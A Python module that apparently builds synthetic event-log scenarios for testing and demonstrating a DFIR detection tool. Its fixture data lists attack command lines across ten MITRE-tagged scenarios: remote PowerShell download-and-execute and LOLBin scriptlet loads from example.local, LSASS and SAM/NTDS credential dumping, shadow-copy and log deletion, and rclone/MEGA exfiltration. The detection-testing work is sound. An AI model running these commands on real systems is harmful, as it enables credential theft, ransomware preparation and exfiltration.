"""Built-in safe demo scenarios for BreachScope.

These samples are **synthetic event logs**. They intentionally use reserved
``example.local``/documentation style values and placeholder arguments so the
project can demonstrate detection, triage, IOC extraction, and reporting without
shipping real payloads or customer data.
"""
from __future__ import annotations

from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Iterable
import json


@dataclass(frozen=True)
class DemoScenario:
    """A synthetic DFIR scenario used for product demos and tests."""

    scenario_id: str
    name: str
    description: str
    primary_tactics: tuple[str, ...]
    expected_techniques: tuple[str, ...]
    events: tuple[dict, ...]


BASE_TIME = datetime(2026, 1, 15, 9, 0, 0, tzinfo=timezone.utc)


def _event(
    minute: int,
    host: str,
    user: str,
    command_line: str,
    *,
    source: str = "ProcessCreate",
    event_id: str = "4688",
    level: str = "Information",
    message: str = "synthetic BreachScope demo event",
    step: str = "",
) -> dict:
    return {
        "timestamp": (BASE_TIME + timedelta(minutes=minute)).isoformat(),
        "host": host,
        "source": source,
        "event_id": event_id,
        "level": level,
        "user": user,
        "command_line": command_line,
        "message": message,
        "sample_step": step,
        "sample_safe": True,
    }


SCENARIOS: tuple[DemoScenario, ...] = (
    DemoScenario(
        scenario_id="powershell_downloader",
        name="PowerShell downloader and encoded execution",
        description="PowerShell 실행 옵션, 원격 스크립트 로드, 인코딩 명령을 함께 보여주는 기본 시나리오입니다.",
        primary_tactics=("Execution", "Command and Control"),
        expected_techniques=("T1059.001", "T1105"),
        events=(
            _event(0, "WS-101", "CORP\\alice", "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command Write-Output SIMULATED", step="PowerShell stealth flags"),
            _event(2, "WS-101", "CORP\\alice", "powershell.exe -encodedcommand AAAABBBBCCCCDDDDEEEEFFFF", step="Encoded PowerShell"),
            _event(4, "WS-101", "CORP\\alice", "powershell.exe Invoke-WebRequest https://example.local/stage1.ps1 -OutFile C:\\ProgramData\\stage1.ps1", step="Web download"),
            _event(6, "WS-101", "CORP\\alice", "powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://example.local/bootstrap.txt')", step="DownloadString execution"),
        ),
    ),
    DemoScenario(
        scenario_id="credential_dump_triage",
        name="Credential dump triage",
        description="LSASS, SAM/SYSTEM, NTDS.dit, WDigest 노출 정황을 한 번에 시연하는 자격증명 탈취 시나리오입니다.",
        primary_tactics=("Credential Access",),
        expected_techniques=("T1003.001", "T1003.002", "T1003.003"),
        events=(
            _event(10, "SRV-DC01", "CORP\\svc-backup", "procdump -ma lsass.exe C:\\Temp\\lsass_simulated.dmp", step="LSASS dump"),
            _event(12, "SRV-DC01", "CORP\\svc-backup", "reg save HKLM\\SAM C:\\Temp\\sam.save", step="SAM hive save"),
            _event(13, "SRV-DC01", "CORP\\svc-backup", "reg save HKLM\\SYSTEM C:\\Temp\\system.save", step="SYSTEM hive save"),
            _event(16, "SRV-DC01", "CORP\\admin", "ntdsutil ifm create full C:\\Temp\\ifm-simulated", step="NTDS IFM"),
            _event(18, "SRV-DC01", "CORP\\admin", "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /d 1", step="WDigest exposure"),
        ),
    ),
    DemoScenario(
        scenario_id="ransomware_preparation",
        name="Ransomware preparation",
        description="복구 방해, Defender 비활성화, 이벤트 로그 삭제 정황을 묶어 랜섬웨어 전조를 보여줍니다.",
        primary_tactics=("Defense Evasion", "Impact"),
        expected_techniques=("T1490", "T1562.001", "T1070.001"),
        events=(
            _event(20, "FS-01", "CORP\\ops", "Set-MpPreference -DisableRealtimeMonitoring $true", step="Defender disable"),
            _event(22, "FS-01", "CORP\\ops", "vssadmin delete shadows /all /quiet", step="Shadow copy removal"),
            _event(24, "FS-01", "CORP\\ops", "wbadmin delete catalog -quiet", step="Backup catalog removal"),
            _event(26, "FS-01", "CORP\\ops", "bcdedit /set recoveryenabled no", step="Recovery disable"),
            _event(30, "FS-01", "CORP\\ops", "wevtutil cl Security", step="Event log clear"),
        ),
    ),
    DemoScenario(
        scenario_id="lateral_movement_remote_admin",
        name="Remote administration lateral movement",
        description="WinRM, PsExec/ADMIN$, 서비스 생성, WMI 원격 실행 흐름을 시연합니다.",
        primary_tactics=("Lateral Movement", "Execution", "Persistence"),
        expected_techniques=("T1021.006", "T1569.002", "T1543.003", "T1047"),
        events=(
            _event(35, "WS-201", "CORP\\helpdesk", "Enter-PSSession -ComputerName WS-202", step="WinRM session"),
            _event(37, "WS-202", "CORP\\helpdesk", "psexec \\\\WS-203 -s cmd /c echo SIMULATED > C:\\Temp\\psexesvc.log", step="PsExec service"),
            _event(39, "WS-203", "CORP\\helpdesk", "sc.exe create UpdateSvc binPath= C:\\ProgramData\\update-sim.exe", step="Service create"),
            _event(41, "WS-203", "CORP\\helpdesk", "wmic process call create \"cmd.exe /c echo lateral-movement-demo\"", step="WMI create"),
        ),
    ),
    DemoScenario(
        scenario_id="active_directory_discovery",
        name="Active Directory discovery sweep",
        description="도메인, 계정, 공유, 프로세스, 보안제품 탐색 명령을 넓게 보여주는 정찰 시나리오입니다.",
        primary_tactics=("Discovery",),
        expected_techniques=("T1087.001", "T1087.002", "T1482", "T1135", "T1057", "T1518.001"),
        events=(
            _event(45, "WS-301", "CORP\\analyst", "whoami /all", step="Account discovery"),
            _event(46, "WS-301", "CORP\\analyst", "nltest /domain_trusts", step="Trust discovery"),
            _event(47, "WS-301", "CORP\\analyst", "net view /domain", step="Share discovery"),
            _event(48, "WS-301", "CORP\\analyst", "nslookup _ldap._tcp.dc._msdcs.example.local", step="DNS discovery"),
            _event(49, "WS-301", "CORP\\analyst", "adfind -f objectcategory=person", step="AD user discovery"),
            _event(50, "WS-301", "CORP\\analyst", "tasklist /svc", step="Process/service discovery"),
            _event(51, "WS-301", "CORP\\analyst", "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct", step="Security software discovery"),
        ),
    ),
    DemoScenario(
        scenario_id="lolbin_proxy_execution",
        name="LOLBins proxy execution cluster",
        description="mshta, rundll32, regsvr32, cmstp, msbuild, installutil, forfiles 같은 서명 바이너리 프록시 실행을 시연합니다.",
        primary_tactics=("Defense Evasion", "Execution"),
        expected_techniques=("T1218.005", "T1218.011", "T1218.010", "T1218.003", "T1127.001", "T1218.004", "T1202"),
        events=(
            _event(55, "WS-401", "CORP\\dev", "mshta http://example.local/demo.hta", step="MSHTA remote"),
            _event(57, "WS-401", "CORP\\dev", "rundll32.exe javascript:SIMULATED", step="Rundll32 scriptlet"),
            _event(59, "WS-401", "CORP\\dev", "regsvr32 /s /n /u /i:http://example.local/demo.sct scrobj.dll", step="Regsvr32 scriptlet"),
            _event(61, "WS-401", "CORP\\dev", "cmstp.exe /s C:\\Temp\\demo.inf", step="CMSTP"),
            _event(63, "WS-401", "CORP\\dev", "msbuild.exe C:\\Temp\\demo.proj /target:Build", step="MSBuild"),
            _event(65, "WS-401", "CORP\\dev", "installutil.exe /logfile= /u C:\\Temp\\demo.dll", step="InstallUtil"),
            _event(67, "WS-401", "CORP\\dev", "forfiles /p C:\\Windows /m notepad.exe /c cmd /c echo SIMULATED", step="Forfiles"),
        ),
    ),
    DemoScenario(
        scenario_id="cloud_exfiltration_staging",
        name="Cloud exfiltration staging",
        description="파일 압축 후 rclone/MEGA 같은 클라우드 동기화 도구 사용 정황과 IOC 추출을 시연합니다.",
        primary_tactics=("Collection", "Exfiltration"),
        expected_techniques=("T1560.001", "T1567.002"),
        events=(
            _event(70, "FS-02", "CORP\\data", "7z a C:\\Temp\\finance_archive.7z C:\\Shares\\Finance\\*.xlsx", step="Archive collection"),
            _event(72, "FS-02", "CORP\\data", "rclone copy C:\\Temp\\finance_archive.7z remote:incident-demo --log-file C:\\Temp\\rclone.log", step="Rclone exfil"),
            _event(74, "FS-02", "CORP\\data", "mega-put C:\\Temp\\finance_archive.7z /Root/demo", step="MEGA exfil"),
            _event(76, "FS-02", "CORP\\data", "curl https://example.local/checkin?id=192.168.10.55&hash=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", step="IOC rich check-in"),
        ),
    ),
    DemoScenario(
        scenario_id="persistence_mechanisms",
        name="Persistence mechanisms",
        description="Run 키, 예약 작업, 서비스 생성, PowerShell New-Service 기반 지속성 등록을 보여줍니다.",
        primary_tactics=("Persistence", "Execution"),
        expected_techniques=("T1547.001", "T1053.005", "T1543.003"),
        events=(
            _event(80, "WS-501", "CORP\\user1", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v DemoUpdater /d C:\\ProgramData\\demo-updater.exe", step="Run key"),
            _event(82, "WS-501", "CORP\\user1", "schtasks /create /tn DemoUpdater /tr C:\\ProgramData\\demo-updater.exe /sc minute /mo 30", step="Scheduled task"),
            _event(84, "WS-501", "CORP\\user1", "sc create DemoUpdater binPath= C:\\ProgramData\\demo-updater.exe", step="Service persistence"),
            _event(86, "WS-501", "CORP\\user1", "New-Service -Name DemoSvc -BinaryPathName C:\\ProgramData\\demo-svc.exe", step="PowerShell service"),
        ),
    ),
    DemoScenario(
        scenario_id="defense_evasion_controls",
        name="Defense evasion control changes",
        description="AMSI, 감사정책, 방화벽, Defender 설정 변경을 모아 방어 회피 점검을 시연합니다.",
        primary_tactics=("Defense Evasion",),
        expected_techniques=("T1562.001", "T1562.002", "T1562.004"),
        events=(
            _event(90, "WS-601", "CORP\\operator", "powershell.exe [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')", step="AMSI string"),
            _event(92, "WS-601", "CORP\\operator", "auditpol /set /success:disable /failure:disable", step="Audit policy disable"),
            _event(94, "WS-601", "CORP\\operator", "netsh advfirewall firewall add rule name=Demo dir=in action=allow protocol=TCP localport=4444", step="Firewall modify"),
            _event(96, "WS-601", "CORP\\operator", "Add-MpPreference -ExclusionPath C:\\Temp", step="Defender exclusion"),
        ),
    ),
    DemoScenario(
        scenario_id="user_data_collection",
        name="User data collection",
        description="브라우저 자격증명 저장소, 클립보드, 화면 캡처, 압축 수집을 보여주는 사용자 데이터 수집 시나리오입니다.",
        primary_tactics=("Collection", "Credential Access"),
        expected_techniques=("T1555.003", "T1115", "T1113", "T1560.001"),
        events=(
            _event(100, "WS-701", "CORP\\designer", "cmd.exe /c dir \"C:\\Users\\designer\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\"", step="Browser credential store"),
            _event(102, "WS-701", "CORP\\designer", "powershell.exe Get-Clipboard", step="Clipboard access"),
            _event(104, "WS-701", "CORP\\designer", "powershell.exe Add-Type -AssemblyName System.Drawing; Graphics.CopyFromScreen(0,0,0,0,0)", step="Screen capture"),
            _event(106, "WS-701", "CORP\\designer", "Compress-Archive C:\\Users\\designer\\Documents C:\\Temp\\documents.zip", step="Archive collection"),
        ),
    ),
)


SCENARIOS_BY_ID = {scenario.scenario_id: scenario for scenario in SCENARIOS}


def list_demo_scenarios() -> list[dict[str, object]]:
    """Return compact metadata for all built-in demo scenarios."""
    return [
        {
            "id": s.scenario_id,
            "name": s.name,
            "description": s.description,
            "primary_tactics": list(s.primary_tactics),
            "expected_techniques": list(s.expected_techniques),
            "events": len(s.events),
        }
        for s in SCENARIOS
    ]


def get_demo_scenario(scenario_id: str) -> DemoScenario:
    """Return a scenario by id, raising a helpful error for unknown ids."""
    key = scenario_id.strip().lower()
    if key not in SCENARIOS_BY_ID:
        valid = ", ".join(sorted(SCENARIOS_BY_ID))
        raise ValueError(f"unknown demo scenario: {scenario_id!r}. valid values: {valid}, all")
    return SCENARIOS_BY_ID[key]


def iter_scenario_events(scenarios: Iterable[DemoScenario]) -> Iterable[dict]:
    """Yield events with scenario metadata embedded into each row."""
    for scenario in scenarios:
        for idx, event in enumerate(scenario.events, 1):
            row = dict(event)
            row["sample_scenario_id"] = scenario.scenario_id
            row["sample_scenario_name"] = scenario.name
            row["sample_scenario_description"] = scenario.description
            row["sample_primary_tactics"] = list(scenario.primary_tactics)
            row["sample_expected_techniques"] = list(scenario.expected_techniques)
            row["sample_event_index"] = idx
            yield row


def write_demo_scenario(scenario_id: str, out_dir: Path) -> Path:
    """Write one scenario, or all scenarios, to JSONL files and return out_dir."""
    out_dir.mkdir(parents=True, exist_ok=True)
    selected = SCENARIOS if scenario_id.strip().lower() == "all" else (get_demo_scenario(scenario_id),)
    for scenario in selected:
        target = out_dir / f"{scenario.scenario_id}.jsonl"
        with target.open("w", encoding="utf-8") as f:
            for row in iter_scenario_events((scenario,)):
                f.write(json.dumps(row, ensure_ascii=False) + "\n")
    _write_readme(out_dir, selected)
    return out_dir


def write_all_demo_scenarios(out_dir: Path) -> Path:
    """Write every built-in scenario to JSONL files."""
    return write_demo_scenario("all", out_dir)


def summarize_sample_context(events: Iterable[object], findings: Iterable[object] = ()) -> list[dict[str, object]]:
    """Summarize embedded sample scenario metadata for reports.

    Real customer logs will not contain these fields, so this returns an empty
    list outside of demos.
    """
    grouped: dict[str, dict[str, object]] = {}
    for event in events:
        raw = getattr(event, "raw", {}) or {}
        scenario_id = raw.get("sample_scenario_id")
        if not scenario_id:
            continue
        row = grouped.setdefault(
            str(scenario_id),
            {
                "id": str(scenario_id),
                "name": raw.get("sample_scenario_name", str(scenario_id)),
                "description": raw.get("sample_scenario_description", ""),
                "primary_tactics": raw.get("sample_primary_tactics", []),
                "expected_techniques": raw.get("sample_expected_techniques", []),
                "events": 0,
                "findings": 0,
                "hosts": set(),
                "matched_rules": set(),
                "matched_techniques": set(),
            },
        )
        row["events"] = int(row["events"]) + 1
        if getattr(event, "host", None):
            row["hosts"].add(event.host)

    for finding in findings:
        event = getattr(finding, "event", None)
        raw = getattr(event, "raw", {}) if event else {}
        scenario_id = raw.get("sample_scenario_id")
        if not scenario_id or str(scenario_id) not in grouped:
            continue
        row = grouped[str(scenario_id)]
        row["findings"] = int(row["findings"]) + 1
        if getattr(finding, "rule_name", None):
            row["matched_rules"].add(finding.rule_name)
        if getattr(finding, "mitre_technique", None):
            row["matched_techniques"].add(finding.mitre_technique)

    result = []
    for row in grouped.values():
        normalized = dict(row)
        normalized["hosts"] = sorted(row["hosts"])
        normalized["matched_rules"] = sorted(row["matched_rules"])
        normalized["matched_techniques"] = sorted(row["matched_techniques"])
        result.append(normalized)
    return sorted(result, key=lambda x: str(x["id"]))


def _write_readme(out_dir: Path, scenarios: Iterable[DemoScenario]) -> None:
    rows = list(scenarios)
    lines = [
        "# BreachScope built-in demo scenarios",
        "",
        "이 폴더의 JSONL은 실제 침해 데이터가 아니라 BreachScope 시연/테스트용 합성 로그입니다.",
        "도메인은 example.local, 파일명은 demo/simulated 값을 사용합니다.",
        "",
        "| ID | Name | Events | Expected Techniques |",
        "|---|---|---:|---|",
    ]
    for scenario in rows:
        lines.append(
            f"| `{scenario.scenario_id}` | {scenario.name} | {len(scenario.events)} | {', '.join(scenario.expected_techniques)} |"
        )
    lines.extend([
        "",
        "## Run",
        "",
        "```bash",
        "python scripts/run.py --input samples/scenarios --export-json --export-csv",
        "python scripts/run.py --demo-scenario ransomware_preparation --export-json --export-csv",
        "```",
        "",
    ])
    (out_dir / "README.md").write_text("\n".join(lines), encoding="utf-8")
